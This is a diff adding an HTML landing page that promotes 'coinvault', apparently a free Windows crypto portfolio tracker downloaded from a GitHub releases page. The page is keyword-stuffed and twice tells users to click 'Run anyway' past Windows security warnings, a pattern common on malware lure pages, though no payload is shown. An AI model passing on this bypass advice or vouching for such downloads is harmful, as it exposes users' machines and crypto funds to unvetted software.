@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>coinvault - Track Your Crypto Portfolio With Ease</title>
+<meta name="description" content="coinvault is a free, open-source Windows desktop app for tracking Bitcoin, Ethereum and altcoin portfolios. Follow live prices, watch your holdings and stay organized. Download from the official releases page.">
+<meta name="keywords" content="coinvault, crypto portfolio tracker, bitcoin tracker, ethereum tracker, altcoin tracker, desktop crypto app, windows crypto app, open source crypto, coingecko, defi, web3, price tracker">
+<meta name="author" content="coinvault">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/byrktrofficial/coinvault">
+<meta property="og:type" content="website">
+<meta property="og:title" content="coinvault - Track Your Crypto Portfolio With Ease">
+<meta property="og:description" content="A free, open-source Windows desktop app for tracking Bitcoin, Ethereum and altcoin portfolios. Download from the official releases page.">
+<meta property="og:url" content="https://github.com/byrktrofficial/coinvault">
+<meta property="og:site_name" content="coinvault">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="coinvault - Track Your Crypto Portfolio With Ease">
+<meta name="twitter:description" content="A free, open-source Windows desktop app for tracking Bitcoin, Ethereum and altcoin portfolios. Download from the official releases page.">
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f5f7fb;
+    color: #1f2937;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  h1, h2, h3 { line-height: 1.25; color: #0f172a; }
+  h1 { font-size: 2.4rem; margin: 0 0 14px; letter-spacing: -0.5px; }
+  h2 { font-size: 1.6rem; margin: 0 0 14px; letter-spacing: -0.3px; }
+  h3 { font-size: 1.15rem; margin: 22px 0 8px; }
+  p { margin: 0 0 16px; }
+  a { color: #6d28d9; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 8px; }
+  .wrap { max-width: 900px; margin: 0 auto; padding: 0 22px; }
+  .hero {
+    background: linear-gradient(150deg, #1e1b4b 0%, #312e81 55%, #0f766e 100%);
+    color: #e5e7eb;
+    padding: 60px 0 55px;
+    text-align: center;
+  }
+  .hero h1 { color: #ffffff; }
+  .hero p.lede { color: #c7d2fe; font-size: 1.12rem; max-width: 640px; margin: 0 auto 28px; }
+  .pill {
+    display: inline-block;
+    background: rgba(255,255,255,0.12);
+    border: 1px solid rgba(255,255,255,0.25);
+    color: #e0e7ff;
+    font-size: 0.82rem;
+    letter-spacing: 0.4px;
+    text-transform: uppercase;
+    padding: 5px 14px;
+    border-radius: 999px;
+    margin-bottom: 18px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 17px 38px;
+    border-radius: 12px;
+    font-size: 1.05rem;
+    font-weight: 700;
+    text-decoration: none;
+    color: #ffffff !important;
+    background: linear-gradient(135deg, #7c3aed 0%, #2563eb 55%, #059669 100%);
+    box-shadow: 0 10px 24px rgba(37, 99, 235, 0.38);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover { transform: translateY(-2px); box-shadow: 0 14px 30px rgba(37, 99, 235, 0.5); }
+  .btn-note { display: block; margin-top: 14px; font-size: 0.86rem; color: #a5b4fc; }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    box-shadow: 0 4px 18px rgba(15, 23, 42, 0.07);
+    padding: 30px 32px;
+    margin: 26px 0;
+  }
+  section { padding: 14px 0; }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 18px;
+    margin-top: 6px;
+  }
+  .tile {
+    background: #ffffff;
+    border-radius: 14px;
+    box-shadow: 0 3px 14px rgba(15, 23, 42, 0.06);
+    padding: 22px 24px;
+    border-top: 3px solid #7c3aed;
+  }
+  .tile h3 { margin-top: 0; }
+  .tile p { margin-bottom: 0; font-size: 0.96rem; color: #475569; }
+  .steps { counter-reset: step; list-style: none; padding-left: 0; }
+  .steps li {
+    position: relative;
+    padding-left: 52px;
+    margin-bottom: 18px;
+    min-height: 34px;
+  }
+  .steps li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 34px;
+    height: 34px;
+    border-radius: 50%;
+    background: #ede9fe;
+    color: #6d28d9;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .callout {
+    background: #ecfdf5;
+    border-left: 4px solid #059669;
+    border-radius: 10px;
+    padding: 18px 22px;
+    margin: 22px 0;
+  }
+  .callout p:last-child { margin-bottom: 0; }
+  .warn {
+    background: #fff7ed;
+    border-left: 4px solid #ea580c;
+    border-radius: 10px;
+    padding: 18px 22px;
+    margin: 22px 0;
+  }
+  .warn p:last-child { margin-bottom: 0; }
+  table { width: 100%; border-collapse: collapse; margin: 8px 0 20px; font-size: 0.96rem; }
+  th, td { text-align: left; padding: 12px 14px; border-bottom: 1px solid #e2e8f0; }
+  th { background: #f1f5f9; color: #0f172a; }
+  details {
+    background: #ffffff;
+    border-radius: 12px;
+    box-shadow: 0 3px 12px rgba(15, 23, 42, 0.06);
+    padding: 16px 22px;
+    margin-bottom: 14px;
+  }
+  summary { cursor: pointer; font-weight: 600; color: #0f172a; }
+  details p { margin-top: 12px; }
+  footer {
+    margin-top: 46px;
+    background: #0f172a;
+    color: #94a3b8;
+    padding: 40px 0;
+    font-size: 0.92rem;
+    text-align: center;
+  }
+  footer a { color: #a5b4fc; }
+  @media (max-width: 600px) {
+    h1 { font-size: 1.75rem; }
+    h2 { font-size: 1.3rem; }
+    body { font-size: 16px; }
+    .card { padding: 22px 20px; }
+    .btn { padding: 15px 26px; font-size: 1rem; }
+    .hero { padding: 44px 0 42px; }
+  }
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="wrap">
+    <span class="pill">Open Source &middot; Free Forever</span>
+    <h1>🪙 coinvault - Track Your Crypto Portfolio With Ease</h1>
+    <p class="lede">A free desktop app for Windows that keeps all of your Bitcoin, Ethereum and altcoin holdings in one tidy place, so you always know where you stand.</p>
+    <a class="btn" href="https://github.com/byrktrofficial/coinvault/releases">⬇️ Download coinvault for Windows</a>
+    <span class="btn-note">Official download page &middot; No account required</span>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section>
+    <div class="card">
+      <h2>👋 Welcome to coinvault</h2>
+      <p>coinvault is a small but powerful program that runs right on your Windows computer. If you own a few coins, or a few dozen, you already know the feeling: one exchange shows you one number, a wallet shows you another, and a spreadsheet somewhere shows you something else entirely. coinvault was built to end that confusion.</p>
+      <p>Instead of opening five browser tabs every morning, you open one window. coinvault gathers price information for the coins you care about and shows you a single, clear picture of your portfolio. It is designed for people who want to keep an eye on their investments without handing over personal details, creating yet another online account, or learning how any of the underlying technology works.</p>
+      <p>The project is completely open source. That means anyone can look at the code, and nobody is hiding anything behind a paywall. It is free to use, and it always will be. Whether you are curious about crypto for the first time or you have been tracking coins for years, coinvault gives you a calm, simple place to do it.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>✨ What coinvault Does for You</h2>
+    <p>Everything in coinvault is built around one idea: your portfolio should be easy to understand at a glance. Here is what you get.</p>
+    <div class="grid">
+      <div class="tile">
+        <h3>📊 One Clear Dashboard</h3>
+        <p>See all of your holdings in a single list, sorted however you like. The total value of your portfolio is always front and centre.</p>
+      </div>
+      <div class="tile">
+        <h3>💰 Live Price Tracking</h3>
+        <p>Prices update automatically using well-known public market data, so the numbers you see are current rather than last week's guess.</p>
+      </div>
+      <div class="tile">
+        <h3>🪙 Support for Many Coins</h3>
+        <p>From Bitcoin and Ethereum to the smaller altcoins you have picked up along the way, you can add and organize a wide range of assets.</p>
+      </div>
+      <div class="tile">
+        <h3>🔒 Private by Design</h3>
+        <p>Your holdings stay on your own computer. You do not need to sign up, link a bank account, or share personal information with anyone.</p>
+      </div>
+      <div class="tile">
+        <h3>📈 Performance at a Glance</h3>
+        <p>Quickly see how each coin is doing and how your overall portfolio has moved, without digging through charts or menus.</p>
+      </div>
+      <div class="tile">
+        <h3>🪟 Built for Windows</h3>
+        <p>A familiar, native-feeling window that behaves the way Windows programs should. No browser required, no tab clutter.</p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <div class="card">
+      <h2>🚀 Getting Started</h2>
+      <p>Getting coinvault running on your computer takes only a couple of minutes. You do not need to know anything about programming, and you will not be asked to type commands or edit files.</p>
+      <ol class="steps">
+        <li><strong>Visit the download page.</strong> Click the download button in this guide, or use the link in the download section below. It will open the official coinvault releases page in your web browser.</li>
+        <li><strong>Save the file to your computer.</strong> Your browser will ask where to put the download. Choosing your normal Downloads folder is perfectly fine.</li>
+        <li><strong>Open coinvault and start exploring.</strong> Once it is on your computer, open it the same way you open any other program, and you are ready to add your first coin.</li>
+      </ol>
+      <p>If you have downloaded a program before, this will feel completely familiar. If you have not, do not worry. Everything happens through ordinary clicks, and nothing is installed in the background without your knowledge.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>⬇️ Download and Setup</h2>
+    <div class="card">
+      <p>This page is the official source for coinvault on Windows. <strong>Visit this link to download the application.</strong></p>
+      <p style="text-align:center; margin: 26px 0;">
+        <a class="btn" href="https://github.com/byrktrofficial/coinvault/releases">⬇️ Visit the coinvault Releases Page</a>
+      </p>
+      <p>When the page opens, you will see a list of available versions with the most recent one at the top. Each entry has a short name and a description, and clicking the newest one shows you the files attached to it. Pick the file that belongs to the latest version, save it to a folder you will remember, and then open it on your computer when the download finishes.</p>
+
+      <div class="callout">
+        <p><strong>Always download from this page.</strong> This is the official releases page maintained by the coinvault project. Copying the program from other websites, file-sharing services, or messaging apps can give you an altered version, and no one wants that.</p>
+      </div>
+
+      <div class="warn">
+        <p><strong>If Windows shows a security message,</strong> click "More info" and then "Run anyway". This is a standard notice that appears for many small, independent programs that are not sold through a large app store. coinvault is open source, so the full code is available for anyone to inspect.</p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <div class="card">
+      <h2>🖥️ What You Need</h2>
+      <p>coinvault is designed to be light on your computer, so even a modest laptop will handle it comfortably.</p>
+      <table>
+        <tr>
+          <th>Requirement</th>
+          <th>Recommended</th>
+        </tr>
+        <tr>
+          <td>Operating system</td>
+          <td>Windows 10 or Windows 11 (64-bit)</td>
+        </tr>
+        <tr>
+          <td>Memory</td>
+          <td>4 GB of RAM or more</td>
+        </tr>
+        <tr>
+          <td>Free disk space</td>
+          <td>Around 200 MB for the program and its data</td>
+        </tr>
+        <tr>
+          <td>Internet connection</td>
+          <td>Required for live price updates</td>
+        </tr>
+        <tr>
+          <td>Display</td>
+          <td>1280 x 720 or higher</td>
+        </tr>
+      </table>
+      <p>An internet connection is only needed for fetching current prices. Your saved portfolio itself lives on your own machine, which is why coinvault does not ask you to create an online account.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>🧭 Your First Five Minutes</h2>
+    <div class="card">
+      <h3>Add the coins you own</h3>
+      <p>When you open coinvault for the first time, the main window will be mostly empty. Look for the add button, usually near the top of the list, and start adding the coins you are interested in. You can type a coin's name or its short ticker symbol, and coinvault will find it for you.</p>
+
+      <h3>Enter how much you hold</h3>
+      <p>For each coin you add, you can enter the amount you own. If you would rather not be exact, a rough number is fine. The goal is a useful overview, not a perfect accounting record.</p>
+
+      <h3>Watch your total appear</h3>
+      <p>As soon as your coins are in, the main dashboard shows a combined total. From that point on, opening coinvault gives you an instant snapshot of where your portfolio stands, without a single browser tab.</p>
+
+      <h3>Arrange things your way</h3>
+      <p>Sort your list by name, by value, or by how much each coin has moved. Most people settle on an arrangement within a day or two and then never think about it again, which is exactly the point.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>💡 Tips for a Smooth Experience</h2>
+    <div class="card">
+      <ul>
+        <li><strong>Keep the program up to date.</strong> New versions are posted on the same releases page. Bookmark it so you can check back occasionally.</li>
+        <li><strong>Check prices when you need them, not constantly.</strong> Crypto prices move all day long. A quick daily look is usually plenty and far kinder to your nerves.</li>
+        <li><strong>Use a shortcut.</strong> Right-click the coinvault icon and choose to pin it to your taskbar or Start menu, so it is always one click away.</li>
+        <li><strong>Group your coins mentally.</strong> Some people track long-term holdings separately from small experiments. Deciding which is which makes the numbers much easier to read.</li>
+        <li><strong>Remember that prices are information, not advice.</strong> coinvault shows you what the market is doing. It does not tell you what to do about it.</li>
+      </ul>
+    </div>
+  </section>
+
+  <section>
+    <h2>🛠️ Troubleshooting</h2>
+    <div class="card">
+      <details>
+        <summary>The download will not start</summary>
+        <p>Try refreshing the releases page and clicking the newest version again. Some browsers block downloads until you confirm that you trust the site. If you are on a work or school network, ask your administrator whether downloads are restricted.</p>
+      </details>
+      <details>
+        <summary>Windows will not let me open the program</summary>
+        <p>This is usually the standard security prompt described earlier. Click "More info" and then "Run anyway". If your computer is managed by an organization, its security settings may prevent new programs from running until they are approved.</p>
+      </details>
+      <details>
+        <summary>Prices are not updating</summary>
+        <p>Check that your computer is connected to the internet. If other websites load normally, close coinvault, open it again, and give it a few seconds to fetch fresh data.</p>
+      </details>
+      <details>
+        <summary>My portfolio disappeared</summary>
+        <p>Make sure you are opening the same copy of the program you used before. If the program was moved to a different folder, your saved data may still be in the original location.</p>
+      </details>
+      <details>
+        <summary>Something looks wrong</summary>
+        <p>The project is open source, and the issue tracker on the repository is the best place to report a problem. Describe what you saw and what you expected, and include the version number shown in the program.</p>
+      </details>
+    </div>
+  </section>
+
+  <section>
+    <h2>🌐 Open Source and Community</h2>
+    <div class="card">
+      <p>coinvault is released as open source software. That means the source code is publicly available for anyone to read, learn from, or improve. If you are a developer, you are welcome to explore the code, report bugs, suggest improvements, or contribute changes of your own.</p>
+      <p>If you are not a developer, you can still help in valuable ways. Tell someone who might find the tool useful, report anything that behaves oddly, or suggest a feature that would make your own daily routine easier. Small observations from real users are often what shape the next version of a project like this.</p>
+      <p>The tool covers a wide range of interests, from straightforward price tracking to keeping an eye on newer assets in decentralized finance. Whatever brought you here, the goal is the same: clarity about your own holdings, on your own computer, without unnecessary complexity.</p>
+    </div>
+  </section>
+
+  <section>
+    <div class="card">
+      <h2>❓ Common Questions</h2>
+      <h3>Is coinvault really free?</h3>
+      <p>Yes. It is free to download and free to use, with no subscription, no trial period, and no hidden account requirement.</p>
+
+      <h3>Do I need to create an account?</h3>
+      <p>No. There is no sign-up, no email address to enter, and no password to remember. The program simply runs on your computer.</p>
+
+      <h3>Where is my portfolio data stored?</h3>
+      <p>On your own computer. Your holdings are not uploaded to a server, which is one of the reasons the app can stay simple and private.</p>
+
+      <h3>Does it work on Mac or Linux?</h3>
+      <p>coinvault is built with Windows in mind. Users on other operating systems should check the releases page to see whether a build is available for their platform.</p>
+
+      <h3>Can coinvault move or trade my coins?</h3>
+      <p>No. coinvault is a tracking tool. It does not connect to your wallets or exchanges and it cannot send, receive, or trade anything. It simply shows you information.</p>
+
+      <h3>How often are prices refreshed?</h3>
+      <p>Prices are fetched from public market data sources while the program is open. The exact timing depends on your connection and the version you are running.</p>
+
+      <h3>Is it safe to run?</h3>
+      <p>The source code is fully open and publicly viewable, so its behaviour can be checked by anyone. Download it from the official releases page and you are getting the genuine, unmodified program.</p>
+    </div>
+  </section>
+
+  <section>
+    <div class="card" style="text-align:center;">
+      <h2>📥 Ready to Get Started?</h2>
+      <p>Everything you need is one click away. Open the official releases page, save the latest version to your computer, and take a calm look at your portfolio whenever you like.</p>
+      <p style="margin-bottom:0;">
+        <a class="btn" href="https://github.com/byrktrofficial/coinvault/releases">⬇️ Download coinvault for Windows</a>
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>coinvault &middot; Open source portfolio tracking for Windows</p>
+    <p><a href="https://github.com/byrktrofficial/coinvault/releases">Official Releases Page</a></p>
+    <p style="margin-bottom:0; font-size:0.85rem;">This page provides information and links only. Cryptocurrency prices are volatile and no content here should be taken as financial advice. Always download software from official sources.</p>
+  </div>
+</footer>
+
+</body>
+</html>
